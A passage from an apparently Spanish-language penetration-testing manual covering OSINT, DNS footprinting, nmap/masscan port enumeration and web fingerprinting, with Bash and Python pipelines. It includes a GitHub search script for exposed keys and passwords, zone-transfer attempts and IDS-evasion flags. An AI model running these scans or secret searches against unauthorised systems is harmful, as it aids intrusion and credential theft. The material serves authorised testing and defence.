9. **Documentación:** todas las fuentes, timestamps, hashes y evidencia almacenada en repositorio seguro.

---

## Herramientas Kali y comandos útiles (rápido)

* `whois domain.com`
* `dig +short any domain.com` / `dig mx domain.com`
* `amass enum -passive -d domain.com`
* `subfinder -d domain.com -silent`
* `gau domain.com` / `waybackurls domain.com`
* `theHarvester -d domain.com -b all`
* `ffuf -u https://TARGET/FUZZ -w wordlist.txt`
* `shodan host IP` (requiere API key)
* `certutil` / `openssl s_client -connect host:443`

---

## Ejemplo automático con Python — consulta a crt.sh y GitHub (controlado)

Los scripts que siguen son para uso en laboratorio y respetando APIs/ToS. Configura variables de entorno `GITHUB_TOKEN` y `SHODAN_API` si las usas.

### 1) `crtsh_subdomains.py` — extraer subdominios vía crt.sh (JSON)

```python
#!/usr/bin/env python3
import requests, sys, json, time

def fetch_crtsh(domain):
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        r = requests.get(url, timeout=20)
        r.raise_for_status()
        data = r.json()
        subs = set()
        for item in data:
            name = item.get('name_value','')
            for s in name.splitlines():
                s = s.strip()
                if s:
                    subs.add(s)
        return sorted(subs)
    except Exception as e:
        print("Error crt.sh:", e, file=sys.stderr)
        return []

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: crtsh_subdomains.py domain.com")
        sys.exit(1)
    domain = sys.argv[1]
    subs = fetch_crtsh(domain)
    print("\n".join(subs))
```

Explicación: crt.sh devuelve certificados relacionados; a menudo contiene subdominios. Esta consulta es pública y no debe abusarse (respeta rate limits).

### 2) `github_secrets_search.py` — búsqueda básica en GitHub Code Search (requiere token)

```python
#!/usr/bin/env python3
import os, requests, sys, time, json

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
if not GITHUB_TOKEN:
    print("Set GITHUB_TOKEN env var with personal token (scopes: public_repo/read)")
    sys.exit(1)

def search_github(query, per_page=30, max_pages=2):
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept":"application/vnd.github.v3.text-match+json"}
    results = []
    for page in range(1, max_pages+1):
        url = "https://api.github.com/search/code"
        params = {"q": query, "per_page": per_page, "page": page}
        r = requests.get(url, headers=headers, params=params, timeout=15)
        if r.status_code != 200:
            print("GitHub API error", r.status_code, r.text, file=sys.stderr)
            break
        data = r.json()
        results.extend(data.get("items", []))
        if 'next' not in r.links:
            break
        time.sleep(1)
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: github_secrets_search.py \"org:example key|password\"")
        sys.exit(1)
    q = sys.argv[1]
    items = search_github(q)
    for it in items:
        print(it.get('html_url'))
```

Advertencia: GitHub limita búsquedas; evita consultas amplias. Usa filtros `org:`, `path:`, `extension:` para afinar.

---

## Ejemplo: uso de Shodan (enriquecimiento)

```python
# snippet conceptual (requiere pyshodan o requests + SHODAN_API)
import os, requests
API = os.getenv("SHODAN_API")
if not API:
    raise SystemExit("Set SHODAN_API")
ip="8.8.8.8"
r = requests.get(f"https://api.shodan.io/shodan/host/{ip}?key={API}")
print(r.json())
```

Shodan aporta banners y servicios expuestos; utilízalo para priorizar activos con servicios vulnerables.

---

## Recolección y normalización de resultados

* Guarda resultados en formato JSONL, con metadatos: `source`, `timestamp`, `query`, `data`.
* Mantén un índice maestro (CSV/JSON) con `asset, type, discovery_source, severity, notes`. Esto facilita la integración con el gestor de campaña y la priorización por KPIs.

Ejemplo simple de línea JSONL:

```json
{"ts":1699999999,"source":"crt.sh","domain":"login.example.com","type":"subdomain"}
```

---

## Automatización con recon-ng / SpiderFoot (opcional)

* `recon-ng` y `SpiderFoot` son frameworks para orquestar múltiples módulos OSINT. Son útiles cuando quieres ejecutar pipelines reproducibles y exportar reportes. En Kali, instala y configura módulos con API keys (GitHub, Shodan, etc.) en un entorno controlado.

---

## Manejo de rate-limits y cortes

* Implementa backoff exponencial en scripts que consumen APIs.
* Respeta robots.txt y políticas de uso de servicio para scraping.
* Registra timestamps y cabeceras de rate-limit para auditar y evitar bans.

---

## Enriquecimiento humano: análisis y validación

* Tras la recolección automatizada, realiza validación manual: abrir URLs relevantes en entornos aislados, revisar archivos encontrados y confirmar relevancia. La precisión de OSINT depende en gran parte de juicio humano.

---

## Recomendaciones de mitigación desde la perspectiva defensiva

* Monitorizar búsquedas y scraping en assets propios (tasa de requests, user agents anómalos).
* Implementar protección contra exposición accidental: revisar repositorios internos y pipelines que suben secretos.
* Configurar DMARC/SPF y protección de registros DNS para reducir abuso de correo.
* Habilitar alertas en servicios como Shodan/Censys para cambios en exposición.

---

## Checklist de OSINT reproducible

* [ ] Alcance y exclusiones claros por escrito.
* [ ] Lista de dominios e IPs objetivo iniciales.
* [ ] Repositorio seguro para almacenar resultados (JSONL) y evidencia.
* [ ] Tokens/API keys guardadas en variables de entorno `600`.
* [ ] Scripts con backoff y límites de concurrencia.
* [ ] Validación manual de hallazgos críticos.
* [ ] Documentación de metodología y fuentes en reporte final.

---

# Capítulo 9 — Footprinting de dominio y DNS

**Objetivos**

* Comprender técnicas y herramientas para el footprinting de dominios y DNS: `whois`, `dig`, `sublist3r`, `amass` y utilidades complementarias.
* Aprender a enumerar subdominios de forma segura y reproducible, normalizar resultados y exportarlos a CSV/JSON para integrarlos en el flujo de trabajo.
* Proveer scripts prácticos (Bash + Python) listos para adaptar en laboratorios y campañas autorizadas.
* Incluir recomendaciones de mitigación para propietarios de dominios y checklist operativo.

> **Aviso legal y ético:** los ejemplos de este capítulo se deben usar únicamente en entornos controlados o contra activos para los cuales se cuenta con autorización escrita. No realices footprinting intensivo contra objetivos sin consentimiento.

---

## Conceptos clave de DNS y footprinting

* **Whois:** información pública del registrante, fechas, registrador y datos de contacto; útil para identificar propietarios, fechas de expiración y contactos de abuse.
* **Dig:** consulta directa a servidores DNS para obtener registros A, AAAA, MX, TXT, NS, SOA y demás; fundamental para entender la infraestructura.
* **Subdomain enumeration:** proceso de descubrir nombres de hosts asociados a un dominio (subdominios). Técnicas: pasiva (crt.sh, búsquedas, certificados, archivos públicos) y activa (brute-force, DNS zone transfers si están permitidos/posibles).
* **Amass / sublist3r / subfinder:** herramientas que combinan múltiples fuentes pasivas y activas para construir una lista extensa de subdominios.
* **DNS zone transfer (AXFR):** transferencia de zona completa desde un servidor DNS autoritativo; si está habilitado sin restricciones, revela todos los registros — es un error de configuración en la mayoría de los casos.

---

## Flujo de trabajo recomendado (práctico)

1. **Confirmar scope y límites.** Documentar dominios permitidos y exclusiones.
2. **Recolectar whois y metadatos:** fechas de expiración, servidores NS, emails de contacto.
3. **Enumeración pasiva:** crt.sh, certstream, datasets públicos, búsquedas en motores y repos públicos.
4. **Enumeración activa:** `amass enum -active`, wordlists para bruteforce, `subfinder`/`sublist3r`.
5. **Resolución y verificación:** `massdns`, `dnsx` o `dig` para verificar qué subdominios resuelven y sus registros.
6. **Enriquecimiento:** obtener IPs, ASN, geolocalización, certificados TLS y servicios asociados.
7. **Normalización y exportación:** JSONL/CSV con campos: `timestamp,domain,subdomain,ip,source,record_type,notes`.
8. **Documentación y priorización.**

---

## Herramientas y comandos útiles

### whois

```bash
whois example.com
```

* Revisa `Registrar`, `Creation Date`, `Expiration Date`, `Name Server` y contactos. Guarda la salida para auditoría.

### dig

Consultar registros básicos:

```bash
dig +short A example.com
dig +short MX example.com
dig +trace example.com
dig @ns1.example.com AXFR example.com   # probar transferencia de zona (si está permitida por RoE)
```

### amass (recolección pasiva y activa)

Instalación (Kali suele incluirlo) y ejemplo:

```bash
amass enum -passive -d example.com -o amass_passive.txt
amass enum -active -d example.com -o amass_active.txt
```

### sublist3r / subfinder

```bash
sublist3r -d example.com -o sublist3r.txt
subfinder -d example.com -o subfinder.txt
```

### dnsx / massdns (verificación y resolución masiva)

```bash
# dnsx (project discovery):
cat subs.txt | dnsx -a -resp -o resolved.csv

# massdns (alta velocidad, requiere build y wordlist de resolvers)
massdns -r resolvers.txt -t A -o S -w massdns.out subs.txt
```

---

## Script Bash: pipeline de enumeración y exportación CSV

`enum_subdomains.sh` — ejemplo práctico y idempotente. Guarda este archivo, dale permisos y ejecútalo en laboratorio.

```bash
#!/usr/bin/env bash
set -euo pipefail

DOMAIN=${1:-}
OUTDIR=${2:-./out}
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
mkdir -p "$OUTDIR"

if [ -z "$DOMAIN" ]; then
  echo "Uso: $0 dominio.com [outdir]"
  exit 1
fi

echo "[*] Recolectando whois..."
whois "$DOMAIN" > "$OUTDIR/${DOMAIN}_whois_${TIMESTAMP}.txt" || true

echo "[*] Amass (pasivo)..."
amass enum -passive -d "$DOMAIN" -o "$OUTDIR/${DOMAIN}_amass_passive.txt" || true

echo "[*] Subfinder..."
subfinder -d "$DOMAIN" -o "$OUTDIR/${DOMAIN}_subfinder.txt" || true

echo "[*] Concatenando y normalizando..."
cat "$OUTDIR/${DOMAIN}_amass_passive.txt" "$OUTDIR/${DOMAIN}_subfinder.txt" | sed 's/^\*\.//' | sort -u > "$OUTDIR/${DOMAIN}_candidates.txt"

echo "[*] Resolviendo con dnsx (requiere dnsx instalado)..."
if command -v dnsx >/dev/null 2>&1; then
  cat "$OUTDIR/${DOMAIN}_candidates.txt" | dnsx -a -resp -json -silent > "$OUTDIR/${DOMAIN}_resolved.jsonl"
  # Transformar JSONL a CSV simple
  python3 - <<'PY'
import json,csv,sys
infile = sys.argv[1]
outfile = sys.argv[1].replace('.jsonl','.csv')
with open(infile) as fh, open(outfile,'w',newline='',encoding='utf-8') as out:
    w = csv.writer(out)
    w.writerow(['timestamp','domain','subdomain','ip','record','source'])
    for line in fh:
        obj = json.loads(line)
        ts = obj.get('time', '')
        sub = obj.get('host','')
        ips = ",".join(obj.get('answers',[]))
        rec = ",".join(obj.get('type',''))
        src = obj.get('source','')
        w.writerow([ts,'${DOMAIN}',sub,ips,rec,src])
PY
  echo "[*] Resultado CSV: $OUTDIR/${DOMAIN}_resolved.csv"
else
  echo "dnsx no instalado. Se generó candidates: $OUTDIR/${DOMAIN}_candidates.txt"
fi

echo "[*] Probar AXFR (solo si RoE lo permite):"
for ns in $(dig +short NS $DOMAIN); do
  echo "[*] Intentando AXFR en $ns"
  dig @$ns AXFR $DOMAIN +noall +answer || echo "AXFR no permitido en $ns"
done

echo "[*] FIN"
```

Notas:

* `dnsx` produce JSONL con campos que se adaptan al CSV; si no lo tienes, usa `dig` o `massdns` para resolución masiva.
* Mantén `resolvers.txt` actualizado si usas massdns para alta velocidad.

---

## Script Python: enumerador pasivo con crt.sh y exportador CSV

`enum_passive_crtsh.py` — consulta crt.sh, normaliza y exporta CSV. Uso con autorización y respetando rate limits.

```python
#!/usr/bin/env python3
import requests, sys, csv, time, json
if len(sys.argv) < 2:
    print("Uso: enum_passive_crtsh.py dominio.com")
    sys.exit(1)
domain = sys.argv[1]
url = f"https://crt.sh/?q=%25.{domain}&output=json"
resp = requests.get(url, timeout=30)
subs = set()
for item in resp.json():
    name = item.get('name_value','')
    for s in name.splitlines():
        s = s.strip()
        if s and s.endswith(domain):
            subs.add(s.lstrip('*.'))
rows = []
ts = int(time.time())
for s in sorted(subs):
    rows.append({'timestamp':ts,'domain':domain,'subdomain':s,'source':'crt.sh'})
out = f"{domain}_crtsh_{ts}.csv"
with open(out,'w',newline='',encoding='utf-8') as fh:
    w = csv.DictWriter(fh, fieldnames=['timestamp','domain','subdomain','source'])
    w.writeheader()
    w.writerows(rows)
print("Exportado:", out)
```

---

## Enriquecimiento y priorización

Tras obtener subdominios que resuelven, realiza:

* Resolución inversa y obtención de IPs (`dig +short`, `host`) y ASN (whois/`ipinfo` API).
* Comprobación de servicios en puertos visibles (`nmap -sV -p- --top-ports 100 --open ip`).
* Verificar certificados TLS (`openssl s_client -connect host:443 -servername host`) para obtener SANs.
* Priorizar por: subdominio que expone paneles administrativos, servicios en puertos críticos, IPs en ASNs de terceros o que evidencien cloud buckets mal configurados.

---

## Recomendaciones de mitigación para propietarios de dominios

* Deshabilitar transferencias AXFR públicas y restringir respuestas a servidores autorizados.
* Mantener registros NS correctos y monitorear cambios (DNSSEC si aplica).
* Revisar certificados TLS: evitar certificados con wildcards innecesarios y monitorizar con crt.sh o CAs.
* Implementar políticas de gestión de subdominios: lifecycle, eliminación y certificación.
* Monitorizar exposición con alertas en Shodan, Censys y servicios de monitoring TLS.
* Revisar repositorios y pipelines para evitar exposición de hostnames y secretos.

---

## Gestión de resultados y trazabilidad

* Almacenar salidas originales (`whois`, `amass`, `dig`) en un repositorio de evidencia seguro.
* Normalizar a JSONL/CSV para consumo por herramientas de correlación y el gestor de campaña.
* Añadir metadatos: `source`, `timestamp`, `operator`, `campaign_id` para auditoría.

---

## Checklist operativo rápido

* [ ] Alcance y permisos por escrito.
* [ ] WhoIs recolectado y guardado.
* [ ] Enumeración pasiva realizada (crt.sh, amass passive).
* [ ] Enumeración activa (amass active, subfinder) con rate limits.
* [ ] Subdominios verificados/resueltos (dnsx/massdns/dig).
* [ ] Enriquecimiento (IP, ASN, certificados) y priorización.
* [ ] Resultados exportados a CSV/JSON y archivados en repositorio seguro.
* [ ] Reporte de hallazgos con recomendaciones de remediación.

---

# Capítulo 10 — Enumeración de servicios y puertos

**Objetivos**

* Aprender técnicas avanzadas de escaneo con `nmap` y flujos para escaneo masivo seguro y reproducible.
* Conocer cómo combinar `masscan` (para discovery a gran escala) con `nmap` (para análisis detallado).
* Extraer, normalizar y analizar resultados de `nmap` en formato XML mediante parsers en Python para generar CSV/JSON y métricas.
* Entender problemas comunes (falsos positivos, detecciones por IDS/IPS) y cómo mitigar riesgos operativos durante la enumeración.

> **Aviso ético-legal:** los escaneos de red pueden interrumpir servicios o ser interpretados como actividad hostil. Ejecuta estos procedimientos **solo** en entornos bajo tu control o con autorización escrita. Documenta scope, horarios y contactos de emergencia antes de iniciar.

---

## Fundamentos rápidos y consideraciones

* `nmap` es la herramienta estándar para discovery y fingerprinting de servicios. Ofrece modos desde un simple `-sS` (SYN scan) hasta `-sV` (detección de versiones), `-A` (detección agresiva) y `-sC` (scripts NSE básicos).
* El escaneo masivo (miles/millones de IPs) se hace mejor con `masscan` por velocidad y luego se filtra con `nmap` para análisis profundo.
* Ajusta `timing` y `rate` según el alcance y tolerancia de la red; los modos `-T4`/`-T5` son rápidos pero más detectables.
* Considera políticas de red y evita escanear durante horas pico o en redes críticas.

---

## Comandos `nmap` avanzados (selección esencial)

1. **Escaneo SYN stealth con detección de versiones:**

```bash
nmap -sS -sV -p- -T4 --min-rate 1000 -oA scans/target_full 10.0.0.5
```

* `-p-` escanea todos los puertos TCP.
* `--min-rate` fuerza una velocidad mínima de paquetes (usar con precaución).
* `-oA` guarda salida en formatos nmap (`.nmap`, `.xml`, `.gnmap`).

2. **Escaneo UDP (más lento, con scripts):**

```bash
nmap -sU -p 53,67,69,123,161 --script vuln -T3 -oA scans/target_udp 10.0.0.5
```

UDP es ruidoso y lento: planifícalo y limita puertos.

3. **Escaneo con NSE (scripts):**

```bash
nmap -sS -sV --script "default,safe,auth" -p 22,80,443 -oA scans/target_nse 10.0.0.5
```

Usa colecciones de scripts apropiadas; `vuln` y `exploit` pueden causar impactos.

4. **Evitar detección simple (ejemplo educativo, en scope permitido):**

* Fragmentación de paquetes: `-f` (no recomendable en redes modernas).
* Cambiar fuente de puertos: `--source-port 53` (hecho solo en pruebas autorizadas).
  Evitar estas técnicas a menos que estén en el RoE y con conocimiento del cliente y legal.

---

## Flujo masivo: Masscan -> Nmap

1. **Discovery rápido con masscan** (ejemplo: top-ports scan sobre un /16)

```bash
sudo masscan 10.0.0.0/16 -p0-65535 --rate 10000 -oL masscan.out
```

`--rate` debe calibrarse para la red. `-oL` produce listado legible.

2. **Convertir resultados masscan para nmap**

```bash
cat masscan.out | awk '/open/ {print $4":"$3}' | sed 's/\/tcp//' | sort -u > targets_for_nmap.txt
# targets_for_nmap.txt ejemplo: 10.0.0.5:22
```

3. **Ejecutar nmap en modo paralelo por lotes**

```bash
parallel -a targets_for_nmap.txt -j 10 --colsep ':' 'nmap -sS -sV -p {2} -oA scans/{1}_{2} {1}'
```

Usar `parallel` o `xargs -P` para controlar concurrencia y evitar saturación.

---

## Salida de nmap: formatos

* `-oX` produce XML (ideal para parsing).
* `-oG` grepable (legacy).
* `-oA` guarda en los tres formatos (`.nmap`, `.xml`, `.gnmap`).

Siempre guarda archivos `.xml` junto con timestamps y metadatos (`campaign_id`, `operator`) para trazabilidad.

---

## Parser Python para nmap XML (exporta CSV/JSON y métricas)

A continuación un script `nmap_xml_parser.py` que:

* Lee un archivo `nmap.xml`.
* Extrae hosts, puertos abiertos, servicios, versiones, scripts NSE y resultados.
* Genera `hosts_summary.csv` y `detailed_results.json`.

```python
#!/usr/bin/env python3
"""
nmap_xml_parser.py
Uso: python3 nmap_xml_parser.py path/to/scan.xml
Salida:
 - hosts_summary.csv (host,ip,os,tcp_open_ports_count,udp_open_ports_count)
 - detailed_results.json (estructura completa por host)
"""
import sys, xml.etree.ElementTree as ET, csv, json, os, time

def parse_nmap_xml(path):
    tree = ET.parse(path)
    root = tree.getroot()
    nsmap = ''  # nmap XML uses no namespace usually
    results = []
    for host in root.findall('host'):
        h = {'addresses':[], 'hostnames':[], 'ports':[], 'os':None, 'status':None}
        status = host.find('status')
        if status is not None:
            h['status'] = status.get('state')
        for addr in host.findall('address'):
            h['addresses'].append({'addr': addr.get('addr'), 'type': addr.get('addrtype')})
        for hn in host.findall('hostnames/hostname'):
            h['hostnames'].append(hn.get('name'))
        os_elem = host.find('os/osmatch')
        if os_elem is not None:
            h['os'] = {'name': os_elem.get('name'), 'accuracy': os_elem.get('accuracy')}
        ports = host.findall('ports/port')
        for p in ports:
            port_obj = {'protocol': p.get('protocol'), 'portid': int(p.get('portid')), 'state':None, 'service':None, 'scripts':[]}
            state = p.find('state')
            if state is not None:
                port_obj['state'] = state.get('state')
            service = p.find('service')
            if service is not None:
                port_obj['service'] = {k:v for k,v in service.items()}
            for s in p.findall('script'):
                port_obj['scripts'].append({'id': s.get('id'), 'output': s.get('output')})
            h['ports'].append(port_obj)
        # host scripts (top level)
        h_scripts = []
        for hs in host.findall('hostscript/script'):
            h_scripts.append({'id': hs.get('id'), 'output': hs.get('output')})
        h['host_scripts'] = h_scripts
        results.append(h)
    return results

def summarize_hosts(results):
    rows = []
    for h in results:
        ip = next((a['addr'] for a in h['addresses'] if a['type']=='ipv4'), (h['addresses'][0]['addr'] if h['addresses'] else ''))
        hostname = h['hostnames'][0] if h['hostnames'] else ''
        tcp_open = sum(1 for p in h['ports'] if p['protocol']=='tcp' and p['state']=='open')
        udp_open = sum(1 for p in h['ports'] if p['protocol']=='udp' and p['state']=='open')
        rows.append({'host': hostname, 'ip': ip, 'os': h.get('os',{}).get('name',''), 'tcp_open': tcp_open, 'udp_open': udp_open})
    return rows

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: nmap_xml_parser.py scan.xml")
        sys.exit(1)
    infile = sys.argv[1]
    outdir = os.path.splitext(infile)[0] + "_parsed"
    os.makedirs(outdir, exist_ok=True)
    data = parse_nmap_xml(infile)
    # Summary CSV
    summary = summarize_hosts(data)
    csvfile = os.path.join(outdir, "hosts_summary.csv")
    with open(csvfile,'w',newline='',encoding='utf-8') as fh:
        w = csv.DictWriter(fh, fieldnames=['host','ip','os','tcp_open','udp_open'])
        w.writeheader()
        w.writerows(summary)
    # Detailed JSON
    jsonfile = os.path.join(outdir, "detailed_results.json")
    with open(jsonfile,'w',encoding='utf-8') as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)
    print("Parsed outputs:", csvfile, jsonfile)
```

**Uso:** `python3 nmap_xml_parser.py scans/target_full.xml`

El JSON resultante permite alimentar dashboards o alimentar el gestor de campaña para KPIs como: número de hosts con puertos expuestos, servicios críticos detectados, versión de software vulnerable.

---

## Analítica y métricas útiles

* Hosts con puertos administrativos expuestos (22, 3389, 5900, 5985/5986).
* Servicios con versiones antiguas/known-vuln (generar lista comparando `service.version` con una DB CVE).
* Ratio de hosts vivos vs. hosts esperados (discovery completeness).
* Tiempo medio de escaneo y throughput (paquetes/s).
* Falsos positivos: servicios que responden con banners genéricos — validar manualmente.

---

## Manejo de falsos positivos y verificación

* Corrobora con `telnet host port` o `curl` para servicios HTTP.
* Ejecuta `nmap -sV --version-all -p PORT host` para mejorar fingerprinting.
* En caso de detección por IDS, reduce `--min-rate` y usa `-T2` o `-T3` y escaneo por horas programadas.

---

## Evitar impacto y detección accidental

* Prueba en snapshots: siempre.
* Coordina con equipo de infraestructura sobre ventanas de mantenimiento.
* No uses `--script vuln` o `exploit` en entornos productivos sin permiso — pueden causar fallos.
* Controla retries y timeouts: `--host-timeout`, `--max-retries` y `--initial-rtt-timeout` permiten ajustar comportamiento.

---

## Recomendaciones de mitigación para propietarios

* Cerrar puertos innecesarios y aplicar listas de control de acceso (firewall).
* Habilitar autenticación fuerte y MFA en servicios expuestos.
* Mantener software actualizados y aplicar mitigaciones para servicios críticos.
* Monitorizar patrones de escaneo: tasa de peticiones, múltiples puertos desde una IP, scanning fingerprint.
* Implementar response rate limiting y WAF para interfaces HTTP expuestas.

---

## Checklist rápido antes de escanear

* [ ] Autorización escrita y alcance claro.
* [ ] Snapshots de máquinas objetivo o entorno de prueba.
* [ ] Prueba de `masscan` con bajo `--rate` para calibrar impacto.
* [ ] Uso de `nmap` en modo controlado con logs y etiquetas (`-oA`).
* [ ] Parser en Python para normalizar y almacenar resultados.
* [ ] Validación manual de hallazgos críticos.
* [ ] Documentación y entrega de resultados con recomendaciones accionables.

---

# Capítulo 11 — Banners, fingerprinting y huellas de aplicaciones

**Objetivos**

* Comprender técnicas de fingerprinting web y banners: qué información entregan y cómo interpretarla.
* Aprender a usar herramientas comunes: `httprint`, `whatweb`, `Wappalyzer` (CLI) y complementos (`curl`, `nmap` http- scripts).
* Construir pipelines para ejecutar varias herramientas, normalizar y agrupar resultados en un único informe estructurado (JSON/CSV).
* Incluir plantillas en **Bash** y **Python** para automatizar fingerprinting, score de confianza y exportación de resultados.
* Reforzar la ética: usar únicamente en objetivos en scope y con autorización escrita; evitar pruebas destructivas.

---

## Conceptos clave

* **Banner**: información que un servicio revela al conectar (por ejemplo, banner SSH o encabezado Server: en HTTP). Útil para identificar software y versiones.
* **Fingerprinting activo**: envío de peticiones/sondas específicas para provocar respuestas que identifiquen el producto (ej.: `httprint`).
* **Fingerprinting pasivo**: analizar respuestas estándar (headers, cookies, HTML) sin técnicas agresivas (ej.: `whatweb`, `Wappalyzer`).
* **Falsos positivos / coincidencias parciales**: siempre validar manualmente hallazgos críticos; combinar varias fuentes reduce error.
* **TTPs defensivas**: minimizar info en banners (ocultar versiones), usar WAF, y saneamiento de headers.

---

## Herramientas y modos de operación (resumen práctico)

* `httprint` — fingerprinting activo HTTP (plantillas de firmas).
* `whatweb` — analiza headers, meta-tags, URLs y signatures; pluginable. Ejemplo: `whatweb -v --log-verbose=out.json target`.
* `wappalyzer` — analizador de tecnologías web (CLI o librería). Su CLI puede producir JSON.
* `curl` / `openssl s_client` — obtener headers y certificados TLS.
* `nmap` (`-sV --script=http-enum,http-title,http-headers`) — complementa con scripts NSE.

---

## Flujo recomendado

1. **Recolección básica:** `curl -I` y `openssl s_client` para headers y certificado.
2. **Fingerprints rápidas:** `whatweb`, `wappalyzer` (CLI).
3. **Fingerprinting activo:** `httprint` si está permitido.
4. **Enriquecimiento:** `nmap -sV --script=http-headers,http-enum`.
5. **Normalización y agregación:** parsear cada salida y combinar en JSON con scores de confianza.
6. **Validación manual** para hallazgos de alto impacto (paneles administrativos, versiones vulnerables).

---

## Ejemplos de comandos

Headers y certificado:

```bash
curl -Is https://target.example.com | sed -n '1,40p'
echo | openssl s_client -connect target.example.com:443 -servername target.example.com 2>/dev/null | openssl x509 -noout -text | sed -n '1,120p'
```

WhatWeb (JSON):

```bash
whatweb --log-json=whatweb_out.json https://target.example.com
```

Wappalyzer CLI (si está instalado; salida JSON):

```bash
wappalyzer https://target.example.com --quiet --json > wappalyzer_out.json
```

httprint (ejemplo básico; salida texto):

```bash
httprint -h target.example.com -P /usr/local/httprint/fp.dat -p 80,443 -o httprint_out.txt
```

Nmap NSE:

```bash
nmap -sV --script=http-headers,http-title,http-enum -p 80,443 target.example.com -oX nmap_http.xml
```

---

## Pipeline Bash: ejecutar herramientas y guardar salidas

`fingerprint_pipeline.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail
TARGET=$1
OUTDIR=${2:-./fingerprints}
mkdir -p "$OUTDIR"
ts=$(date +%Y%m%d_%H%M%S)

echo "[*] curl headers"
curl -Is "https://${TARGET}" > "$OUTDIR/${TARGET}_headers_${ts}.txt" || true

echo "[*] whatweb"
whatweb --log-json="$OUTDIR/${TARGET}_whatweb_${ts}.json" "https://${TARGET}" || true

echo "[*] wappalyzer (si disponible)"
if command -v wappalyzer >/dev/null 2>&1; then
  wappalyzer "https://${TARGET}" --quiet --json > "$OUTDIR/${TARGET}_wappalyzer_${ts}.json" || true
fi

echo "[*] nmap http scripts"
nmap -sV --script=http-headers,http-title,http-enum -p 80,443 "$TARGET" -oX "$OUTDIR/${TARGET}_nmap_http_${ts}.xml" || true

echo "[*] httprint (si instalado y permitido)"
if command -v httprint >/dev/null 2>&1; then
  httprint -h "$TARGET" -P /usr/local/httprint/fp.dat -p 80,443 -o "$OUTDIR/${TARGET}_httprint_${ts}.txt" || true
fi

echo "Outputs in $OUTDIR"
```

Ajusta rutas y permisos; usa en entornos autorizados.

---

## Agregador Python: parseo y fusión de fingerprints

`aggregate_fingerprints.py` — lee salidas típicas (whatweb JSON, wappalyzer JSON, nmap XML, curl headers, httprint text) y produce un único JSON con `technologies`, `banners`, `tls`, `confidence_score`.

```python
#!/usr/bin/env python3
import json, os, sys, xml.etree.ElementTree as ET
from collections import defaultdict

def load_json(path):
    with open(path,'r',encoding='utf-8') as f:
        return json.load(f)

def parse_whatweb(path):
    # whatweb JSON structure: list of dicts per URL
    data = load_json(path)
    techs = []
    try:
        for entry in data:
            if 'plugins' in entry:
                for p in entry['plugins']:
                    techs.append({'name':p.get('name'), 'confidence': p.get('confidence',0)})
    except Exception:
        pass
    return techs

def parse_wappalyzer(path):
    data = load_json(path)
    techs = []
    # Wappalyzer CLI can return technologies list
    if isinstance(data, dict):
        for tech in data.get('technologies', []):
            techs.append({'name': tech.get('name'), 'confidence': tech.get('confidence', 0)})
    return techs

def parse_nmap_xml(path):
    techs=[]
    try:
        tree = ET.parse(path); root=tree.getroot()
        for host in root.findall('host'):
            for port in host.findall('ports/port'):
                svc = port.find('service')
                if svc is not None:
                    prod = svc.get('product') or svc.get('name')
                    ver = svc.get('version') or ''
                    if prod:
                        techs.append({'name':f"{prod} {ver}".strip(), 'confidence': 80})
    except Exception:
        pass
    return techs

def parse_httprint(path):
    techs=[]
    try:
        with open(path,'r',encoding='utf-8') as f:
            for line in f:
                line=line.strip()
                if line and line.startswith('Matched:'):
                    # ejemplo: Matched: Apache/2.4.1
                    parts=line.split(':',1)[1].strip()
                    techs.append({'name':parts,'confidence':90})
    except Exception:
        pass
    return techs

def parse_headers(path):
    techs=[]
    try:
        with open(path,'r',encoding='utf-8') as f:
            for l in f:
                if l.lower().startswith('server:'):
                    techs.append({'name':l.split(':',1)[1].strip(), 'confidence':60})
    except Exception:
        pass
    return techs

def aggregate(list_of_techs):
    agg = defaultdict(lambda: {'name':None,'sources':[], 'score':0})
    for t in list_of_techs:
        name = t['name']
        agg[name]['name']=name
        agg[name]['sources'].append(t.get('source','unknown'))
        agg[name]['score'] += t.get('confidence',50)
    # normalize score to 0-100
    out=[]
    for v in agg.values():
        raw = v['score']
        score = max(0, min(100, int(raw/len(v['sources']))))
        out.append({'name':v['name'],'sources':v['sources'],'confidence':score})
    return sorted(out, key=lambda x: x['confidence'], reverse=True)

if __name__ == "__main__":
    if len(sys.argv)<2:
        print("Usage: aggregate_fingerprints.py <outdir>")
        sys.exit(1)
    outdir=sys.argv[1]
    techs=[]
    # detect files
    for fname in os.listdir(outdir):
        path=os.path.join(outdir,fname)
        if fname.endswith('.json') and 'whatweb' in fname:
            for t in parse_whatweb(path): t['source']='whatweb'; techs.append(t)
        if fname.endswith('.json') and 'wappalyzer' in fname:
            for t in parse_wappalyzer(path): t['source']='wappalyzer'; techs.append(t)
        if fname.endswith('.xml') and 'nmap' in fname:
            for t in parse_nmap_xml(path): t['source']='nmap'; techs.append(t)
        if fname.endswith('.txt') and 'httprint' in fname:
            for t in parse_httprint(path): t['source']='httprint'; techs.append(t)
        if fname.endswith('.txt') and 'headers' in fname:
            for t in parse_headers(path): t['source']='headers'; techs.append(t)
    aggregated = aggregate(techs)
    with open(os.path.join(outdir,'aggregated_techs.json'),'w',encoding='utf-8') as fh:
        json.dump({'aggregated':aggregated, 'raw':techs}, fh, indent=2, ensure_ascii=False)
    print("Aggregated written to", os.path.join(outdir,'aggregated_techs.json'))
```

**Notas sobre el agregador**

* El script aplica una lógica simple de scoring: suma de confidencias y normalización por número de fuentes. Puedes mejorar con pesos por herramienta (por ejemplo, httprint puede tener peso mayor si plantillas coinciden).
* Guarda `raw` para auditoría y trazabilidad.

---

## Validación y verificación manual

* Verificar los endpoints principales con `curl -L` y revisar HTML (formularios, metatags) manualmente en un navegador en entorno aislado.
* Si detectas una versión vulnerable, intenta reproducir con comandos no destructivos y registra evidencia (capturas, headers, hashes).
* Reportar la vulnerabilidad junto con pruebas y mitigaciones sugeridas (p. ej. actualizar paquete, ocultar versión, WAF rule).

---

## Recomendaciones defensivas

* Minimizar información en `Server:` y otros headers.
* Configurar TLS adecuadamente y evitar certificados débiles.
* Implementar WAF y reglas de bloqueo contra fingerprinting excesivo (rate limit).
* Monitorear patrones de requests que combinen múltiples técnicas de scanning/fingerprinting.

---

